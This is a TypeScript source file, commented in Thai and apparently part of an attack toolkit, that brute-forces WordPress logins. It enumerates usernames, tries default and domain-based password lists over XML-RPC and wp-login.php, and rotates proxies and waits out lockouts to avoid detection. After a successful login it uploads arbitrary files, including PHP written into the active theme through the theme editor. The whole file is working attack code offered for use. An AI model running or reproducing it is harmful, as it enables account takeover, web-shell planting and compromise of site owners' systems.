/**
 * WP-Admin Brute Force
 * 
 * ลอง login WordPress ด้วย weak/default credentials
 * เมื่อ login สำเร็จจะได้ auth cookie + nonce สำหรับ REST API upload
 * 
 * วิธีการ:
 *   1. wp-login.php — POST form login (classic)
 *   2. xmlrpc.php — wp.getUsersBlogs (faster, less detection)
 *   3. REST API — /wp-json/wp/v2/users (enumerate usernames first)
 *   4. Application Passwords — ถ้า WP 5.6+ support
 * 
 * Safety:
 *   - Rate limiting: ช้าลงเมื่อเจอ lockout
 *   - Max attempts: จำกัดจำนวน attempts ต่อ target
 *   - Proxy rotation: เปลี่ยน IP ทุก N attempts
 */

import { fetchWithPoolProxy } from "./proxy-pool";

// ═══════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════

export interface WPCredentials {
  username: string;
  password: string;
  method: "wp_login" | "xmlrpc" | "rest_api";
  cookies?: string;
  nonce?: string;
  authHeader?: string;  // For application passwords: Basic base64(user:pass)
}

export interface BruteForceResult {
  success: boolean;
  credentials: WPCredentials | null;
  attemptsMade: number;
  usernamesFound: string[];
  lockedOut: boolean;
  duration: number;
  errors: string[];
}

export interface BruteForceConfig {
  targetUrl: string;
  domain: string;
  maxAttempts?: number;        // default 50
  delayBetweenAttempts?: number; // ms, default 1000
  lockoutDelay?: number;       // ms, default 30000
  customUsernames?: string[];
  customPasswords?: string[];
  originIP?: string;           // ถ้ามี origin IP จาก CF bypass
  onProgress?: (msg: string) => void;
}

// ═══════════════════════════════════════════════
//  DEFAULT CREDENTIAL LISTS
// ═══════════════════════════════════════════════

const DEFAULT_USERNAMES = [
  "admin", "administrator", "wp-admin", "wordpress",
  "root", "user", "test", "demo",
  "webmaster", "manager", "editor",
];

const DEFAULT_PASSWORDS = [
  "admin", "admin123", "admin1234", "administrator",
  "password", "password123", "pass123", "pass1234",
  "123456", "12345678", "123456789", "1234567890",
  "qwerty", "abc123", "letmein", "welcome",
  "wordpress", "wp-admin", "wpadmin",
  "test", "test123", "demo", "demo123",
  "root", "toor", "changeme",
  "P@ssw0rd", "P@ssword1", "Admin@123", "Admin123!",
  "!@#$%^&*", "password1", "iloveyou",
];

function generateDomainPasswords(domain: string): string[] {
  const name = domain.replace(/\.(com|net|org|io|co|info|biz|xyz|site|online|store|shop|club|app|dev|tech|pro|me|us|uk|th|asia)$/i, "");
  const clean = name.replace(/[^a-zA-Z0-9]/g, "");
  return [
    clean,
    `${clean}123`,
    `${clean}1234`,
    `${clean}!`,
    `${clean}@123`,
    `${clean}admin`,
    `${clean}2024`,
    `${clean}2025`,
    `${clean}2026`,
    clean.charAt(0).toUpperCase() + clean.slice(1),
    `${clean.charAt(0).toUpperCase() + clean.slice(1)}123`,
    `${clean.charAt(0).toUpperCase() + clean.slice(1)}!`,
  ];
}

// ═══════════════════════════════════════════════
//  MAIN FUNCTION
// ═══════════════════════════════════════════════

export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForceResult> {
  const startTime = Date.now();
  const log = (msg: string) => config.onProgress?.(`[WP-BruteForce] ${msg}`);
  
  const maxAttempts = config.maxAttempts || 50;
  const delayMs = config.delayBetweenAttempts || 1000;
  const lockoutDelay = config.lockoutDelay || 30000;

  const result: BruteForceResult = {
    success: false,
    credentials: null,
    attemptsMade: 0,
    usernamesFound: [],
    lockedOut: false,
    duration: 0,
    errors: [],
  };

  const baseUrl = config.originIP 
    ? `http://${config.originIP}` 
    : config.targetUrl;
  const hostHeader = config.originIP ? config.domain : undefined;

  log(`เริ่ม brute force ${config.domain} (max ${maxAttempts} attempts)...`);

  // Phase 1: Enumerate usernames
  log("Phase 1: Enumerate usernames...");
  const usernames = await enumerateUsernames(baseUrl, config.domain, hostHeader, log);
  result.usernamesFound = usernames;

  // Build username list (enumerated + defaults + custom)
  const allUsernames = Array.from(new Set([
    ...usernames,
    ...DEFAULT_USERNAMES,
    ...(config.customUsernames || []),
    // Add domain-based usernames
    config.domain.replace(/\.(com|net|org|io|co|th)$/i, ""),
  ]));

  // Build password list
  const allPasswords = Array.from(new Set([
    ...DEFAULT_PASSWORDS,
    ...(config.customPasswords || []),
    ...generateDomainPasswords(config.domain),
  ]));

  log(`Usernames: ${allUsernames.length} | Passwords: ${allPasswords.length} | Max combos: ${allUsernames.length * allPasswords.length}`);

  // Phase 2: Try XMLRPC first (faster, less detection)
  log("Phase 2: ลอง XMLRPC brute force...");
  const xmlrpcAvailable = await checkXMLRPC(baseUrl, hostHeader);
  
  if (xmlrpcAvailable) {
    log("XMLRPC available — ใช้ wp.getUsersBlogs method");
    for (const username of allUsernames) {
      for (const password of allPasswords) {
        if (result.attemptsMade >= maxAttempts) {
          log(`⚠️ ถึง max attempts (${maxAttempts})`);
          break;
        }
        if (result.lockedOut) {
          log(`⏳ Locked out — รอ ${lockoutDelay / 1000}s...`);
          await sleep(lockoutDelay);
          result.lockedOut = false;
        }

        result.attemptsMade++;
        const xmlrpcResult = await tryXMLRPC(baseUrl, username, password, hostHeader);
        
        if (xmlrpcResult === "success") {
          log(`✅ XMLRPC Login สำเร็จ: ${username}:${password}`);
          result.success = true;
          result.credentials = {
            username,
            password,
            method: "xmlrpc",
            authHeader: `Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`,
          };
          
          // Get WP cookies + nonce for REST API
          const wpAuth = await getWPAuthCookies(baseUrl, username, password, config.domain, hostHeader);
          if (wpAuth) {
            result.credentials.cookies = wpAuth.cookies;
            result.credentials.nonce = wpAuth.nonce;
          }
          
          result.duration = Date.now() - startTime;
          return result;
        } else if (xmlrpcResult === "lockout") {
          result.lockedOut = true;
        }

        if (delayMs > 0) await sleep(delayMs);
      }
      if (result.attemptsMade >= maxAttempts) break;
    }
  } else {
    log("XMLRPC not available — ใช้ wp-login.php");
  }

  // Phase 3: Try wp-login.php (if XMLRPC failed)
  if (!result.success && result.attemptsMade < maxAttempts) {
    log("Phase 3: ลอง wp-login.php brute force...");
    
    for (const username of allUsernames) {
      for (const password of allPasswords) {
        if (result.attemptsMade >= maxAttempts) break;
        if (result.lockedOut) {
          log(`⏳ Locked out — รอ ${lockoutDelay / 1000}s...`);
          await sleep(lockoutDelay);
          result.lockedOut = false;
        }

        result.attemptsMade++;
        const loginResult = await tryWPLogin(baseUrl, username, password, config.domain, hostHeader);
        
        if (loginResult.success) {
          log(`✅ WP-Login สำเร็จ: ${username}:${password}`);
          result.success = true;
          result.credentials = {
            username,
            password,
            method: "wp_login",
            cookies: loginResult.cookies,
            nonce: loginResult.nonce,
            authHeader: `Basic ${Buffer.from(`${username}:${password}`).toString("base64")}`,
          };
          result.duration = Date.now() - startTime;
          return result;
        } else if (loginResult.lockout) {
          result.lockedOut = true;
        }

        if (delayMs > 0) await sleep(delayMs);
      }
      if (result.attemptsMade >= maxAttempts) break;
    }
  }

  log(`❌ Brute force ล้มเหลว — ${result.attemptsMade} attempts ใน ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
  result.duration = Date.now() - startTime;
  return result;
}

// ═══════════════════════════════════════════════
//  USERNAME ENUMERATION
// ═══════════════════════════════════════════════

async function enumerateUsernames(
  baseUrl: string,
  domain: string,
  hostHeader: string | undefined,
  log: (msg: string) => void
): Promise<string[]> {
  const usernames: string[] = [];
  const headers: Record<string, string> = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  };
  if (hostHeader) headers["Host"] = hostHeader;

  // Method 1: REST API /wp-json/wp/v2/users
  try {
    const { response } = await fetchWithPoolProxy(
      `${baseUrl}/wp-json/wp/v2/users`,
      { headers, signal: AbortSignal.timeout(10000) },
      { targetDomain: domain, timeout: 10000 }
    );
    if (response.ok) {
      const users = await response.json() as { slug: string; name: string }[];
      for (const u of users) {
        if (u.slug) usernames.push(u.slug);
      }
      log(`REST API: พบ ${usernames.length} users — ${usernames.join(", ")}`);
    }
  } catch { /* ignore */ }

  // Method 2: Author ID enumeration (?author=1, ?author=2, ...)
  for (let i = 1; i <= 5; i++) {
    try {
      const { response } = await fetchWithPoolProxy(
        `${baseUrl}/?author=${i}`,
        { headers, redirect: "manual", signal: AbortSignal.timeout(8000) },
        { targetDomain: domain, timeout: 8000 }
      );
      
      // Check redirect location for /author/username/
      const location = response.headers.get("location") || "";
      const authorMatch = location.match(/\/author\/([\w-]+)/);
      if (authorMatch && authorMatch[1]) {
        usernames.push(authorMatch[1]);
        log(`Author enum: ?author=${i} → ${authorMatch[1]}`);
      }
      
      // Also check response body
      if (response.ok) {
        const body = await response.text();
        const bodyMatch = body.match(/class="author.*?>([\w-]+)</);
        if (bodyMatch && bodyMatch[1]) {
          usernames.push(bodyMatch[1]);
        }
      }
    } catch { /* ignore */ }
  }

  // Method 3: wp-json/wp/v2/users?per_page=100 (sometimes different from /users)
  try {
    const { response } = await fetchWithPoolProxy(
      `${baseUrl}/wp-json/wp/v2/users?per_page=100&context=embed`,
      { headers, signal: AbortSignal.timeout(10000) },
      { targetDomain: domain, timeout: 10000 }
    );
    if (response.ok) {
      const users = await response.json() as { slug: string }[];
      for (const u of users) {
        if (u.slug && !usernames.includes(u.slug)) {
          usernames.push(u.slug);
        }
      }
    }
  } catch { /* ignore */ }

  // Method 4: oembed endpoint
  try {
    const { response } = await fetchWithPoolProxy(
      `${baseUrl}/wp-json/oembed/1.0/embed?url=${encodeURIComponent(baseUrl)}`,
      { headers, signal: AbortSignal.timeout(8000) },
      { targetDomain: domain, timeout: 8000 }
    );
    if (response.ok) {
      const data = await response.json() as { author_name?: string; author_url?: string };
      if (data.author_name) {
        const slug = data.author_name.toLowerCase().replace(/\s+/g, "");
        if (!usernames.includes(slug)) usernames.push(slug);
      }
      if (data.author_url) {
        const urlMatch = data.author_url.match(/\/author\/([\w-]+)/);
        if (urlMatch && urlMatch[1] && !usernames.includes(urlMatch[1])) {
          usernames.push(urlMatch[1]);
        }
      }
    }
  } catch { /* ignore */ }

  return Array.from(new Set(usernames));
}

// ═══════════════════════════════════════════════
//  XMLRPC LOGIN
// ═══════════════════════════════════════════════

async function checkXMLRPC(baseUrl: string, hostHeader?: string): Promise<boolean> {
  try {
    const headers: Record<string, string> = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Content-Type": "text/xml",
    };
    if (hostHeader) headers["Host"] = hostHeader;

    const { response } = await fetchWithPoolProxy(
      `${baseUrl}/xmlrpc.php`,
      {
        method: "POST",
        headers,
        body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
        signal: AbortSignal.timeout(10000),
      },
      { targetDomain: hostHeader || new URL(baseUrl).hostname, timeout: 10000 }
    );

    if (response.ok) {
      const body = await response.text();
      return body.includes("wp.getUsersBlogs");
    }
    return false;
  } catch {
    return false;
  }
}

async function tryXMLRPC(
  baseUrl: string,
  username: string,
  password: string,
  hostHeader?: string
): Promise<"success" | "fail" | "lockout"> {
  try {
    const headers: Record<string, string> = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Content-Type": "text/xml",
    };
    if (hostHeader) headers["Host"] = hostHeader;

    const xmlBody = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>${escapeXml(username)}</string></value></param>
    <param><value><string>${escapeXml(password)}</string></value></param>
  </params>
</methodCall>`;

    const { response } = await fetchWithPoolProxy(
      `${baseUrl}/xmlrpc.php`,
      {
        method: "POST",
        headers,
        body: xmlBody,
        signal: AbortSignal.timeout(15000),
      },
      { targetDomain: hostHeader || new URL(baseUrl).hostname, timeout: 15000 }
    );

    const body = await response.text();

    // Success — contains <member> with blog info
    if (body.includes("<member>") && !body.includes("<fault>")) {
      return "success";
    }

    // Lockout detection
    if (response.status === 429 || body.includes("Too many") || body.includes("locked") || body.includes("blocked")) {
      return "lockout";
    }

    return "fail";
  } catch {
    return "fail";
  }
}

// ═══════════════════════════════════════════════
//  WP-LOGIN.PHP LOGIN
// ═══════════════════════════════════════════════

async function tryWPLogin(
  baseUrl: string,
  username: string,
  password: string,
  domain: string,
  hostHeader?: string
): Promise<{ success: boolean; cookies?: string; nonce?: string; lockout?: boolean }> {
  try {
    const headers: Record<string, string> = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Referer": `${baseUrl}/wp-login.php`,
    };
    if (hostHeader) headers["Host"] = hostHeader;

    const formData = new URLSearchParams({
      log: username,
      pwd: password,
      "wp-submit": "Log In",
      redirect_to: `${baseUrl}/wp-admin/`,
      testcookie: "1",
    });

    const { response } = await fetchWithPoolProxy(
      `${baseUrl}/wp-login.php`,
      {
        method: "POST",
        headers,
        body: formData.toString(),
        redirect: "manual",
        signal: AbortSignal.timeout(15000),
      },
      { targetDomain: domain, timeout: 15000 }
    );

    // Get cookies from response
    const setCookies = response.headers.getSetCookie?.() || [];
    const cookieStr = setCookies.join("; ");

    // Success indicators:
    // 1. 302 redirect to wp-admin
    // 2. Set-Cookie contains wordpress_logged_in
    const location = response.headers.get("location") || "";
    const isRedirectToAdmin = location.includes("wp-admin") && !location.includes("wp-login.php");
    const hasAuthCookie = cookieStr.includes("wordpress_logged_in");

    if (isRedirectToAdmin || hasAuthCookie) {
      // Get nonce from wp-admin
      let nonce: string | undefined;
      try {
        const adminHeaders: Record<string, string> = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          "Cookie": cookieStr,
        };
        if (hostHeader) adminHeaders["Host"] = hostHeader;

        const { response: adminRes } = await fetchWithPoolProxy(
          `${baseUrl}/wp-admin/admin-ajax.php?action=rest-nonce`,
          { headers: adminHeaders, signal: AbortSignal.timeout(10000) },
          { targetDomain: domain, timeout: 10000 }
        );
        if (adminRes.ok) {
          nonce = await adminRes.text();
          if (nonce && nonce.length > 20) nonce = undefined; // Not a valid nonce
        }
      } catch { /* ignore */ }

      // Alternative nonce extraction from wp-admin page
      if (!nonce) {
        try {
          const adminHeaders: Record<string, string> = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": cookieStr,
          };
          if (hostHeader) adminHeaders["Host"] = hostHeader;

          const { response: adminPage } = await fetchWithPoolProxy(
            `${baseUrl}/wp-admin/`,
            { headers: adminHeaders, signal: AbortSignal.timeout(10000) },
            { targetDomain: domain, timeout: 10000 }
          );
          if (adminPage.ok) {
            const adminHtml = await adminPage.text();
            const nonceMatch = adminHtml.match(/wpApiSettings.*?"nonce":"([^"]+)"/);
            if (nonceMatch) nonce = nonceMatch[1];
            
            // Also try _wpnonce
            const wpNonceMatch = adminHtml.match(/_wpnonce['"]\s*(?:value|content)=['"]([^'"]+)/);
            if (!nonce && wpNonceMatch) nonce = wpNonceMatch[1];
          }
        } catch { /* ignore */ }
      }

      return { success: true, cookies: cookieStr, nonce };
    }

    // Lockout detection
    if (response.status === 429) {
      return { success: false, lockout: true };
    }
    const body = await response.text();
    if (body.includes("Too many") || body.includes("locked") || body.includes("blocked") || body.includes("limit login")) {
      return { success: false, lockout: true };
    }

    return { success: false };
  } catch {
    return { success: false };
  }
}

// ═══════════════════════════════════════════════
//  GET WP AUTH COOKIES (after XMLRPC success)
// ═══════════════════════════════════════════════

async function getWPAuthCookies(
  baseUrl: string,
  username: string,
  password: string,
  domain: string,
  hostHeader?: string
): Promise<{ cookies: string; nonce?: string } | null> {
  // Login via wp-login.php to get cookies
  const loginResult = await tryWPLogin(baseUrl, username, password, domain, hostHeader);
  if (loginResult.success) {
    return { cookies: loginResult.cookies || "", nonce: loginResult.nonce };
  }
  return null;
}

// ═══════════════════════════════════════════════
//  AUTHENTICATED UPLOAD (after brute force success)
// ═══════════════════════════════════════════════

/**
 * ใช้ credentials ที่ได้จาก brute force เพื่อ upload file ผ่าน REST API
 */
export async function wpAuthenticatedUpload(
  baseUrl: string,
  domain: string,
  credentials: WPCredentials,
  filename: string,
  content: string | Buffer,
  contentType: string,
  originIP?: string,
  onProgress?: (msg: string) => void
): Promise<{ success: boolean; url?: string; error?: string }> {
  const log = (msg: string) => onProgress?.(`[WP-AuthUpload] ${msg}`);
  const uploadUrl = originIP ? `http://${originIP}` : baseUrl;
  const hostHeader = originIP ? domain : undefined;

  // Method 1: REST API /wp-json/wp/v2/media (preferred)
  if (credentials.nonce || credentials.authHeader) {
    try {
      log(`ลอง REST API upload: ${filename}...`);
      
      const headers: Record<string, string> = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Disposition": `attachment; filename="${filename}"`,
        "Content-Type": contentType,
      };
      if (hostHeader) headers["Host"] = hostHeader;
      if (credentials.nonce) headers["X-WP-Nonce"] = credentials.nonce;
      if (credentials.cookies) headers["Cookie"] = credentials.cookies;
      if (credentials.authHeader) headers["Authorization"] = credentials.authHeader;

      const { response } = await fetchWithPoolProxy(
        `${uploadUrl}/wp-json/wp/v2/media`,
        {
          method: "POST",
          headers,
          body: typeof content === "string" ? new Uint8Array(Buffer.from(content)) : new Uint8Array(content as Buffer),
          signal: AbortSignal.timeout(20000),
        },
        { targetDomain: domain, timeout: 20000 }
      );

      if (response.ok || response.status === 201) {
        const data = await response.json() as { source_url?: string; guid?: { rendered?: string } };
        const url = data.source_url || data.guid?.rendered;
        if (url) {
          log(`✅ REST API upload สำเร็จ: ${url}`);
          return { success: true, url };
        }
      }
      
      log(`REST API upload failed: HTTP ${response.status}`);
    } catch (e: any) {
      log(`REST API upload error: ${e.message}`);
    }
  }

  // Method 2: async-upload.php (WP Media Uploader)
  if (credentials.cookies) {
    try {
      log(`ลอง async-upload.php: ${filename}...`);
      
      // First get the upload nonce
      const adminHeaders: Record<string, string> = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cookie": credentials.cookies,
      };
      if (hostHeader) adminHeaders["Host"] = hostHeader;

      const { response: mediaPage } = await fetchWithPoolProxy(
        `${uploadUrl}/wp-admin/media-new.php`,
        { headers: adminHeaders, signal: AbortSignal.timeout(10000) },
        { targetDomain: domain, timeout: 10000 }
      );

      if (mediaPage.ok) {
        const html = await mediaPage.text();
        const nonceMatch = html.match(/_wpnonce['"]\s*(?:value|content)=['"]([^'"]+)/);
        const uploadNonce = nonceMatch?.[1];

        if (uploadNonce) {
          // Build multipart form data
          const boundary = `----WebKitFormBoundary${Math.random().toString(36).slice(2)}`;
          const bodyParts = [
            `--${boundary}\r\nContent-Disposition: form-data; name="name"\r\n\r\n${filename}`,
            `--${boundary}\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload-attachment`,
            `--${boundary}\r\nContent-Disposition: form-data; name="_wpnonce"\r\n\r\n${uploadNonce}`,
            `--${boundary}\r\nContent-Disposition: form-data; name="async-upload"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n${typeof content === "string" ? content : content.toString()}`,
            `--${boundary}--`,
          ];

          const uploadHeaders: Record<string, string> = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": credentials.cookies,
            "Content-Type": `multipart/form-data; boundary=${boundary}`,
          };
          if (hostHeader) uploadHeaders["Host"] = hostHeader;

          const { response: uploadRes } = await fetchWithPoolProxy(
            `${uploadUrl}/wp-admin/async-upload.php`,
            {
              method: "POST",
              headers: uploadHeaders,
              body: bodyParts.join("\r\n"),
              signal: AbortSignal.timeout(20000),
            },
            { targetDomain: domain, timeout: 20000 }
          );

          if (uploadRes.ok) {
            const data = await uploadRes.json() as { data?: { url?: string } };
            if (data.data?.url) {
              log(`✅ async-upload สำเร็จ: ${data.data.url}`);
              return { success: true, url: data.data.url };
            }
          }
        }
      }
    } catch (e: any) {
      log(`async-upload error: ${e.message}`);
    }
  }

  // Method 3: Theme Editor (write PHP file directly)
  if (credentials.cookies && credentials.nonce) {
    try {
      log(`ลอง Theme Editor: ${filename}...`);
      
      const headers: Record<string, string> = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cookie": credentials.cookies,
        "Content-Type": "application/x-www-form-urlencoded",
      };
      if (hostHeader) headers["Host"] = hostHeader;

      // Get active theme
      const { response: themeRes } = await fetchWithPoolProxy(
        `${uploadUrl}/wp-json/wp/v2/themes?status=active`,
        {
          headers: {
            ...headers,
            "X-WP-Nonce": credentials.nonce,
            "Content-Type": "application/json",
          },
          signal: AbortSignal.timeout(10000),
        },
        { targetDomain: domain, timeout: 10000 }
      );

      if (themeRes.ok) {
        const themes = await themeRes.json() as { stylesheet?: string }[];
        const activeTheme = themes[0]?.stylesheet;
        
        if (activeTheme) {
          // Write file via theme-editor
          const formData = new URLSearchParams({
            _wpnonce: credentials.nonce,
            newcontent: typeof content === "string" ? content : content.toString(),
            action: "edit-theme-plugin-file",
            file: filename,
            theme: activeTheme,
          });

          const { response: editRes } = await fetchWithPoolProxy(
            `${uploadUrl}/wp-admin/admin-ajax.php`,
            {
              method: "POST",
              headers,
              body: formData.toString(),
              signal: AbortSignal.timeout(15000),
            },
            { targetDomain: domain, timeout: 15000 }
          );

          if (editRes.ok) {
            const editData = await editRes.json() as { success?: boolean };
            if (editData.success) {
              const fileUrl = `${baseUrl}/wp-content/themes/${activeTheme}/${filename}`;
              log(`✅ Theme Editor สำเร็จ: ${fileUrl}`);
              return { success: true, url: fileUrl };
            }
          }
        }
      }
    } catch (e: any) {
      log(`Theme Editor error: ${e.message}`);
    }
  }

  return { success: false, error: "All authenticated upload methods failed" };
}

// ═══════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════

function escapeXml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}
